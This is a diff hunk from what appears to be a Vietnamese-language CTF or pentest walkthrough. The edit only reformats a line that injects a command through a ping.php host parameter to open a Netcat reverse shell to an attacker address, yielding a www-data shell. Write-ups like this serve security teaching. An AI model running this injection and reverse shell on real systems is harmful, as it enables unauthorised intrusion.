@@ -54,7 +54,7 @@ Bash
 Gửi payload reverse shell thông qua lệnh Netcat/Bash (hoặc Python/Busybox tùy môi trường) qua tham số host:
 
 Plaintext
-http://<target-ip>/admin/sysmaint-checks/ping.php?host=127.0.0.1; nc <attacker-ip> 4444 -e /bin/bash
+`http://<target-ip>/admin/sysmaint-checks/ping.php?host=127.0.0.1; nc <attacker-ip> 4444 -e /bin/bash`
 Kết nối thành công, ta thu được shell dưới quyền người dùng www-data.
 
 # ⚙️ 3. Post-Exploitation & Credential Cracking (Leo thang nội bộ)
